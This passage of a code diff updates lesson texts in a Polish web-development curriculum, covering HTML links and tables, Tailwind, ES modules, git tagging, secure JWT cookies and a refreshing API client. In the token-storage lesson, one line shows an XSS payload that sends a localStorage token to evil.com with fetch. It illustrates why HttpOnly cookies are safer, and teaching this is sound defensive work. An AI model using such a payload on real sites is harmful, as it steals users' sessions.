@@ -145,29 +145,29 @@ export const MISSING_CURRICULUM_LESSONS: Record<number, Lesson[]> = {
         'Tworzyć klikalne linki otwierające program pocztowy (mailto:) oraz wybieranie numeru na telefonie (tel:)',
       ],
       prerequisites: ['Lekcja 3: Listy punktowane i numerowane oraz podstawy linków'],
-      theoryMarkdown: `Znacznik \`<a href="...">\` potrafi znacznie więcej niż tylko przechodzić pod inny adres! Zobaczmy 4 zastosowania linków, których używa się w każdym komercyjnym projekcie.
+      theoryMarkdown: `Znacznik \`<a href="...">\` (*anchor*) to fundament internetu — hipertekst zawdzięcza mu nawet swoją nazwę! Potrafi znacznie więcej niż tylko przenieść odwiedzającego na inną stronę. W profesjonalnych witrynach internetowych każdego dnia wykorzystuje się cztery główne zastosowania odnośników.
 
-**1. Otwieranie linku w nowej karcie (\`target="_blank"\`):**
-Gdy link prowadzi do zewnętrznego serwisu (np. Twojego profilu na GitHubie lub LinkedInie), nie chcesz, aby użytkownik zamknął Twoją stronę. Dopisujesz wtedy **\`target="_blank"\`** oraz zabezpieczenie **\`rel="noopener noreferrer"\`**:
-
+**1. Otwieranie zewnętrznego linku w nowej karcie (\`target="_blank"\`):**
+Gdy odsyłasz czytelnika poza swój serwis (np. do Twojego profilu GitHub, dokumentacji technicznej lub artykułu źródłowego), chcesz, aby Twoja strona pozostała otwarta w tle. Dopisujesz wtedy atrybut **\`target="_blank"\`** wraz z obowiązkowym zabezpieczeniem **\`rel="noopener noreferrer"\`**, które uniemożliwia nowo otwartej stronie dostęp do obiektu \`window.opener\` w Twojej karcie:
 \`\`\`html
 <a href="https://github.com" target="_blank" rel="noopener noreferrer">
-  Mój profil GitHub (nowa karta)
+  Mój profil GitHub (otworzy się w nowej karcie)
 </a>
 \`\`\`
+Uwaga UX: dla wewnętrznych podstron własnej witryny (np. menu *Oferta*, *Kontakt*) **nie** używaj \`target="_blank"\`, żeby nie zaśmiecać użytkownikowi przeglądarki dziesiątkami kart.
 
-**2. Kotwice — płynne przewijanie do sekcji na tej samej stronie (\`#id\`):**
-W menu na górze strony często widzisz linki typu *„Cennik”* lub *„Kontakt”*, które po kliknięciu przewijają ekran w dół. Jak to działa?
-1. Sekcji na dole nadajesz unikalny identyfikator: \`<section id="kontakt">\`
-2. W linku wpisujesz znak kratki \`#\`: \`<a href="#kontakt">Przejdź do kontaktu</a>\`
+**2. Kotwice — płynne skakanie do sekcji na tej samej stronie (\`#id\`):**
+W menu u góry długiej strony często widzisz linki typu *„Cennik”* lub *„FAQ”*, które przewijają widok dokładnie do wybranego fragmentu:
+1. Sekcji docelowej nadajesz unikalny identyfikator: \`<section id="kontakt">\`
+2. W atrybucie \`href\` podajesz znak kratki \`#\` i dokładnie tę samą nazwę: \`<a href="#kontakt">Kontakt</a>\`.
 
-**3. Klikalny e-mail (\`mailto:\`) oraz numer telefonu (\`tel:\`):**
-- **\`<a href="mailto:kontakt@domena.pl">\`**: Automatycznie otwiera program pocztowy z wpisanym adresem odbiorcy.
-- **\`<a href="tel:+48123456789">\`**: Na smartfonie od razu uruchamia ekran dzwonienia!
+**3. Klikalny e-mail (\`mailto:\`), telefon (\`tel:\`) oraz pobieranie plików (\`download\`):**
+- \`<a href="mailto:kontakt@domena.pl">\` uruchamia domyślny program pocztowy z wpisanym odbiorcą.
+- \`<a href="tel:+48500600700">\` na smartfonie natychmiast otwiera klawiaturę wybierania numeru.
+- Atrybut \`download="cv.pdf"\` sugeruje przeglądarce pobranie pliku zamiast otwierania go w karcie.
 
 **4. Ścieżki bezwzględne vs względne:**
-- **Ścieżka bezwzględna:** Pełny adres w internecie zaczynający się od \`https://...\`
-- **Ścieżka względna:** Prowadzi do innego pliku w Twoim własnym projekcie, np. \`href="/o-nas"\` lub \`href="./kontakt.html"\`.`,
+Ścieżka bezwzględna zawiera pełną domenę (\`https://...\`) — używamy jej do zewnętrznych serwisów. Ścieżka względna (\`/o-nas\`, \`./kontakt.html\`, \`../img/logo.png\`) odwołuje się do plików wewnątrz Twojego projektu, dzięki czemu strona działa niezależnie od tego, pod jaką domeną ją opublikujesz.`,
       codeExamples: [
         {
           title: 'Zestaw nawigacji: kotwica, nowa karta oraz klikalny e-mail i telefon',
@@ -276,22 +276,22 @@ W menu na górze strony często widzisz linki typu *„Cennik”* lub *„Kontak
         'Łączyć sąsiednie komórki w poziomie za pomocą atrybutu colspan="2"',
       ],
       prerequisites: ['Lekcja 5: Obrazki na stronie i leniwe ładowanie'],
-      theoryMarkdown: `Kiedy chcesz zaprezentować na stronie cennik pakietów, harmonogram zajęć, tabelę wyników lub podsumowanie koszyka zakupowego, najlepszym narzędziem jest semantyczna tabela **\`<table>\`**.
+      theoryMarkdown: `Kiedy chcesz zaprezentować na stronie cennik pakietów, porównanie parametrów, harmonogram zajęć, tabelę wyników lub podsumowanie faktury, właściwym narzędziem jest semantyczna tabela **\`<table>\`**. Bardzo ważna zasada nowoczesnego web developmentu brzmi: tabel używamy **wyłącznie do danych tabelarycznych** (macierzy wierszy i kolumn), nigdy do budowania układu całej strony internetowej (od tego jest Flexbox i CSS Grid).
 
 **1. Podstawowe klocki tabeli (\`<tr>\`, \`<th>\`, \`<td>\`):**
-Tabela jest układana **wiersz po wierszu** (od góry do dołu):
-- **\`<tr>\` (Table Row — wiersz):** Tworzy nowy poziomy rząd tabeli.
-- **\`<th>\` (Table Header — komórka tytułowa):** Pogrubiona komórka z nazwą kolumny (np. *Produkt*, *Cena*).
-- **\`<td>\` (Table Data — komórka z danymi):** Zwykła komórka zawierająca konkretną wartość (np. *Kurs HTML*, *0 zł*).
+Każdą tabelę w HTML budujemy konsekwentnie **wiersz po wierszu** od góry do dołu:
+- **\`<tr>\` (*Table Row*):** otwiera nowy poziomy wiersz tabeli.
+- **\`<th>\` (*Table Header*):** komórka nagłówkowa dla tytułu kolumny lub wiersza — przeglądarka domyślnie ją pogrubia i wyśrodkowuje, a czytniki ekranu kojarzą jej treść z danymi poniżej (warto dodać \`scope="col"\` lub \`scope="row"\`).
+- **\`<td>\` (*Table Data*):** zwykła komórka przechowująca pojedynczą wartość danych (np. cenę, status lub nazwę usługi).
 
-**2. Profesjonalny podział na 3 sekcje (\`<thead>\`, \`<tbody>\`, \`<tfoot>\`):**
-Tak jak cała strona ma \`<header>\`, \`<main>\` i \`<footer>\`, tak dobrze zbudowana tabela dzieli się na:
-1. **\`<thead>\` (Głowa tabeli):** Otacza pierwszy wiersz z tytułami kolumn \`<th>\`.
-2. **\`<tbody>\` (Ciało tabeli):** Otacza wszystkie główne wiersze z danymi \`<td>\`.
-3. **\`<tfoot>\` (Stopka tabeli):** Opcjonalny dolny wiersz z podsumowaniem (np. *Suma zamówienia: 299 zł*).
+**2. Semantyczny podział na trzy sekcje (\`<thead>\`, \`<tbody>\`, \`<tfoot>\`):**
+Podobnie jak cała strona dzieli się na \`<header>\`, \`<main>\` i \`<footer>\`, dobrze zaprojektowana tabela powinna wyraźnie oddzielać strukturę logiczną:
+- **\`<thead>\` (Nagłówek tabeli):** zawiera wiersz z nazwami kolumn \`<th>\`; podczas drukowania długiej tabeli przeglądarka potrafi powtarzać ten nagłówek na każdej nowej stronie!
+- **\`<tbody>\` (Ciało tabeli):** otacza główne wiersze danych \`<td>\`.
+- **\`<tfoot>\` (Stopka tabeli):** przechowuje wiersz podsumowania, np. łączną kwotę zamówienia lub średni wynik.
 
-**3. Łączenie komórek (\`colspan\`):**
-Jeśli w dolnym wierszu podsumowania chcesz, aby jedna komórka rozciągała się na szerokość dwóch kolumn, dopisujesz do niej **\`colspan="2"\`**!`,
+**3. Łączenie komórek (\`colspan\` i \`rowspan\`) oraz podpis \`<caption>\`:**
+Jeśli w stopce \`<tfoot>\` napis *„Razem do zapłaty:”* ma objąć dwie sąsiednie kolumny w poziomie, dodajemy atrybut **\`colspan="2"\`** (odpowiednik scalania w pionie to \`rowspan\`). Z kolei znacznik \`<caption>\` umieszczony zaraz po \`<table>\` nadaje tabeli opisowy tytuł czytelny dla wyszukiwarek i osób korzystających z czytników ekranu.`,
       codeExamples: [
         {
           title: 'Tabela zamówienia z podziałem na <thead>, <tbody> oraz <tfoot>',
@@ -566,12 +566,12 @@ Gdy użytkownik ma wybrać np. kraj, miasto lub temat zgłoszenia z gotowej list
         'Bezpiecznie osadzać zewnętrzne mapy lub wideo za pomocą <iframe loading="lazy" title="...">',
       ],
       prerequisites: ['Lekcja 12: Multimedia na stronie (video, audio, SVG)'],
-      theoryMarkdown: `Wielu początkujących myśli, że aby zrobić na stronie rozwijane pytanie FAQ (tzw. akordeon), trzeba od razu pisać skrypt w JavaScript. Tymczasem nowoczesny **HTML5 potrafi to zrobić sam z siebie**!
+      theoryMarkdown: `Wielu początkujących programistów zakłada, że nawet najprostsza sekcja FAQ z rozwijanymi pytaniami albo wyskakujące okienko modalne wymagają natychmiast dołączania ciężkich bibliotek JavaScript. Tymczasem nowoczesny standard **HTML5** dostarcza gotowe, w pełni dostępne elementy interaktywne wbudowane bezpośrednio w każdą przeglądarkę!
 
-**1. Rozwijany akordeon FAQ bez JavaScriptu (\`<details>\` i \`<summary>\`):**
-- **\`<details>\`**: Całe pudełko kryjące dodatkową treść (domyślnie zwinięte). Jeśli dopiszesz do niego słowo \`open\`, będzie domyślnie rozwinięte!
-- **\`<summary>\`**: Widoczny nagłówek z trójkątną strzałką, w który klika użytkownik, aby rozwinąć lub zwinąć odpowiedź.
-
+**1. Natywny akordeon FAQ bez JavaScriptu (\`<details>\` i \`<summary>\`):**
+Połączenie \`<details>\` oraz \`<summary>\` tworzy interaktywną zakładkę, która sama obsługuje kliknięcia myszką, obsługę klawiatury (Spacja / Enter) oraz atrybuty dostępności dla czytników ekranu:
+- **\`<details>\`**: cały blok pojedynczego pytania; domyślnie jest zwinięty, a dodanie atrybutu logicznego \`open\` (\`<details open>\`) sprawia, że pytanie otwiera się automatycznie po załadowaniu strony.
+- **\`<summary>\`**: musi być **pierwszym dzieckiem** wewnątrz \`<details>\` — stanowi klikalny nagłówek z trójkątną strzałką, pod którym umieszczamy treść odpowiedzi (\`<p>\`, listę lub kod).
 \`\`\`html
 <details>
   <summary>Czy potrzebuję wcześniejszego doświadczenia w IT?</summary>
@@ -579,13 +579,11 @@ Gdy użytkownik ma wybrać np. kraj, miasto lub temat zgłoszenia z gotowej list
 </details>
 \`\`\`
 
-**2. Natywne okienko wyskakujące (\`<dialog>\`):**
-Znacznik **\`<dialog>\`** to wbudowane w przeglądarkę okno modalne (popup). Posiada automatyczną obsługę klawisza \`Esc\` do zamykania oraz pełne wsparcie dla czytników ekranu.
+**2. Natywne okno modalne (\`<dialog>\`):**
+Znacznik **\`<dialog>\`** wprowadzony w HTML5 eliminuje typowe błędy ręcznie pisanych okienek popup. Otwarty metodą \`.showModal()\` automatycznie wyświetla półprzezroczyste tło (pseudoelement CSS \`::backdrop\`), blokuje kliknięcia w resztę strony pod spodem (*Top Layer*) oraz zamyka się po naciśnięciu klawisza \`Esc\`.
 
-**3. Osadzanie mapy Google lub filmu z YouTube (\`<iframe>\`):**
-Znacznik **\`<iframe>\`** tworzy „okienko” na Twojej stronie, w którym wyświetla się zawartość zewnętrznego serwisu (np. interaktywna mapa dojazdu Google Maps). Pamiętaj o dwóch dobrych praktykach:
-- Zawsze dodawaj **\`title="Mapa dojazdu do biura"\`** (dla dostępności WCAG),
-- Dodawaj **\`loading="lazy"\`**, aby zewnętrzna ramka nie spowalniała startu Twojej strony!`,
+**3. Bezpieczne osadzanie map, filmów i widgetów (\`<iframe>\`):**
+Znacznik **\`<iframe>\`** tworzy na Twojej stronie wydzieloną ramkę ładującą zewnętrzny dokument (np. mapę dojazdu Google Maps lub odtwarzacz YouTube). Zawsze pamiętaj o trzech dobrych praktykach: dodaj opisowy atrybut \`title="..."\` (wymóg dostępności WCAG), ustaw \`loading="lazy"\`, aby ciężka ramka nie opóźniała startu strony, oraz przy zewnętrznych widgetach ogranicz uprawnienia atrybutem \`sandbox\`.`,
       codeExamples: [
         {
           title: 'Sekcja Najczęściej Zadawanych Pytań (FAQ) zbudowana na <details> i <summary>',
@@ -706,19 +704,22 @@ Znacznik **\`<iframe>\`** tworzy „okienko” na Twojej stronie, w którym wyś
         'Projektować spójne skale odstępów (p-4, gap-6), zaokrągleń (rounded-xl) i kontrastu w trybie ciemnym',
       ],
       prerequisites: ['Flexbox i CSS Grid', 'Zmienne CSS i Media Queries'],
-      theoryMarkdown: `Tradycyjne pisanie CSS w dużych aplikacjach często prowadzi do tysięcy linii martwego kodu i problemów z wymyślaniem nazw klas (tzw. *class naming fatigue*).
+      theoryMarkdown: `Pisanie tradycyjnych arkuszy CSS w dużych aplikacjach często prowadzi do dwóch uciążliwych problemów: rosnącego pliku martwych stylów (programiści boją się usuwać stare klasy, żeby nic nie zepsuć w innym widoku) oraz ciągłego wymyślania nazw typu \`.user-profile-header-inner-wrapper\`.
 
-**Filozofia Utility-First (Tailwind CSS):**
-Zamiast wymyślać klasę \`.user-profile-card-wrapper\`, składamy wygląd bezpośrednio w komponencie z małych, jednozadaniowych klas narzędziowych:
-- **Układ i odstępy:** \`flex items-center justify-between gap-4 p-6\`
-- **Typografia i kolory:** \`text-sm font-semibold text-slate-100 bg-slate-900\`
-- **Obramowania i cienie:** \`rounded-2xl border border-slate-800 shadow-xl\`
+**1. Filozofia Utility-First (Tailwind CSS):**
+Zamiast tworzyć osobne klasy semantyczne dla każdego pudełka w oddzielnym pliku CSS, w **Tailwind CSS** składasz wygląd bezpośrednio w kodzie HTML/JSX za pomocą małych, jednozadaniowych klas narzędziowych opartych na spójnym systemie projektowym (*Design System*):
+- **Układ i odstępy:** \`flex items-center justify-between gap-4 p-6\` (odstępy wynikają ze stałej skali co \`0.25rem\`, czyli \`4px\`).
+- **Typografia i kolory:** \`text-sm font-semibold text-slate-100 bg-slate-900\`.
+- **Obramowania, zaokrąglenia i płynne przejścia:** \`rounded-2xl border border-slate-800 shadow-xl transition-all\`.
 
-**Modyfikatory stanów i responsywności:**
-Każdą klasę w Tailwind możesz poprzedzić prefiksem warunku:
-- \`hover:bg-indigo-500\` — styl po najechaniu kursorem
-- \`focus-visible:ring-2\` — widoczny pierścień fokusu dla nawigacji klawiaturą (a11y)
-- \`md:grid-cols-3\` — 3 kolumny na ekranach od \`768px\` wzwyż (Mobile-First!)`,
+**2. Modyfikatory stanów, dostępności i ciemnego motywu:**
+Każdą klasę narzędziową możesz poprzedzić prefiksem warunku, bez pisania ani jednej linijki selektorów w osobnym pliku:
+- \`hover:bg-indigo-500\` i \`active:scale-95\` — natychmiastowy feedback wizualny po najechaniu lub kliknięciu.
+- \`focus-visible:ring-2\` — wyraźna obwódka wyłącznie dla nawigacji z klawiatury (idealna dostępność WCAG).
+- \`dark:bg-slate-950\` — wbudowane wsparcie dla motywu ciemnego.
+
+**3. Podejście Mobile-First i kompilacja JIT (*Just-In-Time*):**
+Prefiksy breakpointów (\`sm:\` 640px, \`md:\` 768px, \`lg:\` 1024px) działają zawsze od mniejszych ekranów w górę (\`min-width\`): np. \`grid-cols-1 md:grid-cols-3\` tworzy 1 kolumnę na smartfonie i 3 na tablecie/desktopie. W dodatku silnik Tailwind skanuje Twój kod w trakcie budowania i do finalnego pliku CSS trafiają **wyłącznie** te klasy, których faktycznie użyłeś!`,
       codeExamples: [
         {
           title: 'Komponent karty w Tailwind CSS z obsługą stanów i responsywności',
@@ -821,23 +822,25 @@ Każdą klasę w Tailwind możesz poprzedzić prefiksem warunku:
         'Korzystać z wbudowanego obiektu Intl.NumberFormat oraz Intl.DateTimeFormat dla języka polskiego',
       ],
       prerequisites: ['Funkcje i obiekty w JS', 'Asynchroniczność i Fetch API'],
-      theoryMarkdown: `Nowoczesny kod JavaScript nigdy nie znajduje się w jednym gigantycznym pliku. Dzielimy go na **Moduły ES6 (ECMAScript Modules)**:
+      theoryMarkdown: `W profesjonalnych aplikacjach kod nigdy nie ląduje w jednym gigantycznym pliku liczącym tysiące linii. Dzielimy go na małe, niezależne i łatwe do testowania **Moduły ES6 (ECMAScript Modules)** z wyraźnymi granicami odpowiedzialności.
 
+**1. Eksport nazwany (\`export\`) vs Eksport domyślny (\`export default\`):**
+- **Named Export (\`export function formatPLN...\`)**: W jednym pliku możesz wyeksportować wiele funkcji i stałych. Podczas importu musisz użyć dokładnych nazw w nawiasach klamrowych (\`import { formatPLN } from './currency.js'\`), co ułatwia autouzupełnianie i refaktoryzację w całym projekcie oraz pozwala bundlerom na **Tree Shaking** (automatyczne usuwanie nieużywanych funkcji z paczki produkcyjnej).
+- **Default Export (\`export default App\`)**: Pozwala na jeden domyślny element z pliku, któremu przy imporcie możesz nadać dowolną nazwę.
+
+**2. Wyrażenia regularne (\`RegExp\`) i natywne formatowanie \`Intl\`:**
+Zanim zainstalujesz zewnętrzną bibliotekę do walidacji czy dat, sprawdź wbudowane możliwości języka! \`RegExp\` błyskawicznie weryfikuje wzorce tekstu (np. kod pocztowy \`/^\\d{2}-\\d{3}$/.test(zip)\`), natomiast standardowe API **\`Intl.NumberFormat\`** oraz **\`Intl.DateTimeFormat\`** poprawnie formatują polskie waluty (\`249,99 zł\`) i odmiany dat bez żadnego narzutu zewnętrznych paczek:
 \`\`\`js
-// utils/currency.js — Eksport nazwany (Named Export)
 export function formatPLN(amount) {
   return new Intl.NumberFormat('pl-PL', {
     style: 'currency',
     currency: 'PLN',
   }).format(amount);
 }
-
-// app.js — Import
-import { formatPLN } from './utils/currency.js';
 \`\`\`
 
-**Zaawansowana obsługa błędów (\`try / catch / finally\`):**
-Blok \`finally\` wykonuje się **zawsze** — niezależnie od tego, czy operacja zakończyła się sukcesem, czy rzuciła wyjątek (np. idealne miejsce na wyłączenie spinnera ładowania \`isLoading = false\`).`,
+**3. Świadoma obsługa wyjątków: \`try / catch / finally\` oraz własne klasy \`Error\`:**
+Nigdy nie zostawiaj pustego bloku \`catch (e) {}\`, który cicho ukrywa awarię! Rzucaj opisowe wyjątki (\`throw new Error(...)\`) lub dziedziczone klasy błędów biznesowych, loguj usterkę i wyświetlaj użytkownikowi zrozumiały komunikat. Blok \`finally\` wykonuje się **zawsze** na samym końcu — zarówno po sukcesie, jak i po błędzie — dzięki czemu idealnie nadaje się do wyłączania wskaźnika ładowania (\`isLoading = false\`).`,
       codeExamples: [
         {
           title: 'Własna klasa błędu walidacji i bezpieczny blok try/catch/finally',
@@ -947,20 +950,23 @@ function validateAge(age) {
         'Konfigurować hook pre-commit (Husky + lint-staged) uruchamiający testy przed każdym commitem',
       ],
       prerequisites: ['Gałęzie i Pull Requesty', 'Kultura Code Review i rebase'],
-      theoryMarkdown: `Skąd zespół i klienci wiedzą, która dokładnie wersja kodu działa obecnie na serwerze produkcyjnym? Służą do tego **Tagi Gita (\`git tag\`)** oraz standard **Semantic Versioning (SemVer)**.
+      theoryMarkdown: `Gdy aplikacja działa już na produkcji, zespół musi dokładnie wiedzieć, jaka wersja kodu kryje się za zgłoszonym błędem, jak bezpiecznie oznaczać kolejne wydania i w jaki sposób automatycznie zatrzymać zepsuty kod jeszcze zanim trafi do repozytorium. Do tego służą **Semantic Versioning (SemVer)**, **Tagi Gita** oraz **Git Hooks**.
 
-**SemVer (\`MAJOR.MINOR.PATCH\`, np. \`v2.4.1\`):**
-- **MAJOR (\`2.x.x\`)** — zmiany niekompatybilne wstecz (*breaking changes*),
-- **MINOR (\`x.4.x\`)** — nowe funkcjonalności dodane w sposób kompatybilny wstecz,
-- **PATCH (\`x.x.1\`)** — poprawki błędów (*bugfixes*) i łatki bezpieczeństwa.
+**1. Standard SemVer (\`MAJOR.MINOR.PATCH\`, np. \`v2.4.1\`):**
+Każdy numer wersji ma ścisłe znaczenie kontraktowe dla innych programistów i systemów:
+- **MAJOR (\`2.x.x\`)** — zmiany zrywające zgodność wsteczną (*breaking changes*), np. usunięcie starego endpointu API lub zmiana formatu odpowiedzi.
+- **MINOR (\`x.4.x\`)** — nowe funkcjonalności dodane w sposób całkowicie kompatybilny wstecz.
+- **PATCH (\`x.x.1\`)** — drobne poprawki błędów (*bugfixes*) i łaty bezpieczeństwa bez zmiany publicznego interfejsu.
 
+**2. Tagi Gita (\`git tag\`) i publikacja GitHub Releases:**
+W przeciwieństwie do gałęzi (które cały czas przesuwają się do przodu z każdym nowym commitem), tag jest trwałą etykietą przypiętą do konkretnego, historycznego commita wydania. Zawsze używaj opisanych tagów z flagą \`-a\` (*annotated tag*) i pamiętaj, że zwykłe \`git push\` nie wysyła tagów automatycznie — trzeba je wypchnąć jawnie:
 \`\`\`bash
-# Utworzenie opisanego tagu wydania (Annotated Tag)
-git tag -a v1.2.0 -m "Release v1.2.0: Dodano obsługę płatności i ProtectedRoute"
-
-# Wypchnięcie tagu do repozytorium zdalnego GitHub
+git tag -a v1.2.0 -m "Release v1.2.0: Logowanie i panel kursanta"
 git push origin v1.2.0
-\`\`\``,
+\`\`\`
+
+**3. Git Hooks (Husky + lint-staged) — automatyczna straż jakości:**
+Aby żaden z programistów przypadkiem nie wysłał kodu z błędem składni, nieużywanym importem ani zepsutym formatowaniem, podpinamy skrypt **\`pre-commit\`** lub **\`pre-push\`**. Narzędzia takie jak Husky uruchamiają automatycznie \`tsc --noEmit\`, ESLint i testy jednostkowe na zmienionych plikach — jeśli test nie przejdzie, Git blokuje commit zanim usterka trafi do wspólnej historii!`,
       codeExamples: [
         {
           title: 'Konfiguracja pre-commit hooka w package.json (Husky + lint-staged)',
@@ -1065,21 +1071,26 @@ git push origin v1.2.0
         'Wdrożyć rotację Refresh Tokenów oraz czarną listę unieważnionych sesji (Token Revocation)',
       ],
       prerequisites: ['Haszowanie bcrypt i JWT', 'Ochrona przed OWASP Top 10'],
-      theoryMarkdown: `Jednym z najczęstszych pytań na rozmowach rekrutacyjnych Senior/Mid Full Stack jest: **„Gdzie przechowujesz token JWT po stronie przeglądarki?”**
+      theoryMarkdown: `Jednym z najczęstszych pytań na technicznych rozmowach rekrutacyjnych jest: *„Gdzie po stronie przeglądarki przechowujesz token sesyjny albo JWT i dlaczego?”*. Od Twojej odpowiedzi zależy, czy aplikacja będzie odporna na najpopularniejsze ataki internetowe z listy OWASP Top 10.
 
-**Dlaczego \`localStorage\` bywa ryzykowny?**
-Każdy skrypt uruchomiony na stronie (np. przez lukę XSS lub zainfekowaną paczkę npm) ma pełny dostęp do \`window.localStorage.getItem('token')\`.
+**1. Dlaczego \`localStorage\` bywa niebezpieczny?**
+Wszystko, co zapiszesz w \`window.localStorage\` lub \`sessionStorage\`, jest dostępne dla **każdego** skryptu JavaScript działającego w obrębie Twojej domeny. Jeśli w formularzu komentarza lub w zewnętrznym skrypcie pojawi się podatność **XSS** (*Cross-Site Scripting*), atakujący jedną linijką \`fetch('https://evil.com?t=' + localStorage.getItem('token'))\` może wykraść sesję użytkownika.
 
-**Rozwiązanie produkcyjne: Ciasteczko \`HttpOnly\` + \`Secure\` + \`SameSite\`:**
+**2. Złoty standard produkcyjny: Ciasteczka z flagami bezpieczeństwa:**
+Zamiast przekazywać token w JSON-ie do \`localStorage\`, backend ustawia go bezpośrednio w odpowiedzi HTTP poprzez nagłówek \`Set-Cookie\` z trzema kluczowymi flagami ochronnymi:
 \`\`\`ts
 res.cookie('access_token', signedJwt, {
-  httpOnly: true,     // Brak dostępu z poziomu document.cookie w JavaScript!
-  secure: true,       // Przesyłane wyłącznie po szyfrowanym połączeniu HTTPS
-  sameSite: 'strict', // Blokuje wysyłanie ciasteczka z obcych domen (ochrona CSRF)
-  maxAge: 15 * 60 * 1000, // 15 minut ważności
+  httpOnly: true,     // Niewidoczne dla document.cookie w JS (ochrona przed XSS!)
+  secure: true,       // Wysyłane wyłącznie przez szyfrowany protokół HTTPS
+  sameSite: 'strict', // Blokuje wysyłanie ciasteczka z obcych stron (ochrona CSRF!)
+  maxAge: 15 * 60 * 1000, // Krótki czas życia: 15 minut
   path: '/',
 });
-\`\`\``,
+\`\`\`
+Po stronie Reacta pamiętaj o przekazaniu opcji \`credentials: 'include'\` w \`fetch()\` (oraz \`credentials: true\` w konfiguracji CORS serwera), inaczej przeglądarka nie dołączy ciasteczek do zapytań między subdomenami.
+
+**3. Architektura Sesji serwerowych vs Bezstanowe JWT:**
+Klasyczna sesja z identyfikatorem w **Redisie** daje natychmiastową możliwość wylogowania dowolnego urządzenia w ułamku sekundy. Z kolei w architekturze z JWT łączymy krótkotrwały Access Token (15 min) z długotrwałym **Refresh Tokenem** zapisanym w bazie — dzięki temu w razie kradzieży lub zmiany hasła możemy unieważnić sesję (*Token Revocation*) przy kolejnym odświeżeniu.`,
       codeExamples: [
         {
           title: 'Bezpieczne ustawienie i wyczyszczenie ciasteczka sesyjnego w Express.js',
@@ -1183,13 +1194,21 @@ res.cookie('access_token', signedJwt, {
         'Prawidłowo skonfigurować nagłówki CORS (Access-Control-Allow-Origin, Allow-Credentials) między klientem a serwerem',
       ],
       prerequisites: ['TanStack Query', 'Tokeny JWT i Refresh Token'],
-      theoryMarkdown: `W profesjonalnej aplikacji React żaden komponent nie wywołuje surowego \`fetch('http://localhost:4000/api/...')\` z ręcznym doklejaniem tokenów. Tworzymy **centralny klient API (HTTP Client)**.
+      theoryMarkdown: `W profesjonalnej aplikacji React żaden komponent UI nie powinien wywoływać bezpośrednio surowego \`fetch('http://localhost:4000/api/...')\` z ręcznie doklejonymi nagłówkami \`Authorization\`, powtarzaną obsługą błędów HTTP czy sprawdzaniem statusów. Zamiast duplikować ten kod w dziesiątkach plików, budujemy jeden **centralny klient HTTP (API Client)**, który stanowi jedyny punkt komunikacji frontendu z backendem.
 
-**Jak działa Response Interceptor przy wygaśnięciu Access Tokenu (401)?**
+**1. Korzyści z centralnej warstwy komunikacji (Wrapper + Interceptors):**
+- **Jedna konfiguracja bazowego URL i nagłówków:** Adres backendu pobieramy ze zmiennej \`import.meta.env.VITE_API_URL\`, dodajemy domyślnie \`Content-Type: application/json\` oraz \`credentials: 'include'\` dla ciasteczek sesyjnych.
+- **Spójne parsowanie błędów:** Gdy API zwróci kod \`4xx\` lub \`5xx\`, klient odczytuje ustrukturyzowany komunikat błędu z serwera i rzuca czytelny wyjątek obsługiwany jednolicie przez TanStack Query i toasty powiadomień.
+
+**2. Jak działa Response Interceptor przy wygaśnięciu Access Tokenu (401 Retry)?**
+Krótkotrwałe tokeny dostępowe (ważne np. 15 minut) drastycznie zwiększają bezpieczeństwo, ale nie powinny co chwilę wyrzucać użytkownika do ekranu logowania:
 1. Komponent wysyła żądanie \`GET /api/orders\`.
-2. Access Token wygasł (minęło 15 minut) — serwer zwraca \`401 Unauthorized\`.
-3. Interceptor przechwytuje błąd \`401\`, w tle wywołuje \`POST /api/auth/refresh\`, pobiera nowy Access Token i **automatycznie ponawia** pierwotne żądanie \`GET /api/orders\`!
-4. Użytkownik nawet nie zauważa, że token w międzyczasie został odświeżony.`,
+2. Serwer zwraca \`401 Unauthorized\`, ponieważ Access Token właśnie wygasł.
+3. Interceptor przechwytuje \`401\`, po cichu wysyła żądanie odświeżenia sesji \`POST /api/auth/refresh\` i po otrzymaniu nowego tokena **automatycznie ponawia** oryginalne żądanie \`GET /api/orders\`.
+4. **Ochrona przed pętlą i wyścigiem (*Mutex*):** Jeśli sam endpoint \`/api/auth/refresh\` zwróci 401 (Refresh Token również wygasł), **nie wolno** ponawiać próby w nieskończoność — wtedy czyścimy sesję i prosimy o ponowne zalogowanie. Gdy 5 zapytań wygaśnie w tej samej milisekundzie, dzielą one jedną wspólną obietnicę \`refreshPromise\`, wysyłając do serwera tylko jedno odświeżenie.
+
+**3. Polityka CORS na produkcji:**
+Pamiętaj, że przy włączonym \`credentials: 'include'\` serwer w nagłówku \`Access-Control-Allow-Origin\` nie może zwracać gwiazdki \`*\`, lecz musi wskazać dokładny adres frontendu.`,
       codeExamples: [
         {
           title: 'Centralny klient Fetch z automatycznym odświeżaniem tokenu przy statusie 401',
@@ -1294,23 +1313,27 @@ res.cookie('access_token', signedJwt, {
         'Zabezpieczać formularze przed podwójnym wysłaniem (Idempotency & isSubmitting state)',
       ],
       prerequisites: ['Formularze w React', 'Walidacja Zod w Express'],
-      theoryMarkdown: `Walidacja wyłącznie na frontendzie to złudzenie bezpieczeństwa (każdy może wysłać zapytanie z Postmana lub \`curl\`). Z kolei walidacja wyłącznie na backendzie daje słaby UX (użytkownik dowiaduje się o literówce dopiero po wysłaniu formularza).
+      theoryMarkdown: `Walidacja formularzy napisana wyłącznie w Reactcie to jedynie wskazówka UX dla uczciwego użytkownika — każdy atakujący może ominąć przeglądarkę i wysłać dowolny payload prosto z terminala poleceniem \`curl\`. Z kolei walidacja istniejąca wyłącznie na serwerze daje fatalny UX, ponieważ użytkownik dowiaduje się o literówce w haśle dopiero po wykonaniu zapytania sieciowego i oczekiwaniu na odpowiedź. Co gorsza, utrzymywanie dwóch osobnych zestawów reguł (innych w Reactcie, innych w Expressie) niemal zawsze prowadzi do rozbieżności!
 
-**Wzorzec Izomorficznej Walidacji (Shared Zod Schema):**
-Definiujemy schemat raz we współdzielonym pliku \`shared/schemas/userSchema.ts\`:
+**1. Wzorzec Izomorficznej Walidacji (*Shared Zod Schema*):**
+Rozwiązaniem jest zdefiniowanie **jednego źródła prawdy** we współdzielonym module \`shared/schemas/authSchema.ts\` za pomocą biblioteki **Zod**:
 \`\`\`ts
 import { z } from 'zod';
 
 export const RegisterSchema = z.object({
-  email: z.string().email('Podaj poprawny adres e-mail'),
+  email: z.string().trim().email('Podaj poprawny adres e-mail'),
   password: z.string().min(8, 'Hasło musi mieć minimum 8 znaków'),
   role: z.enum(['student', 'admin']).default('student'),
 });
 
-// Automatyczny typ TypeScript wygenerowany ze schematu!
+// Typ TypeScript generuje się automatycznie ze schematu — zero duplikacji:
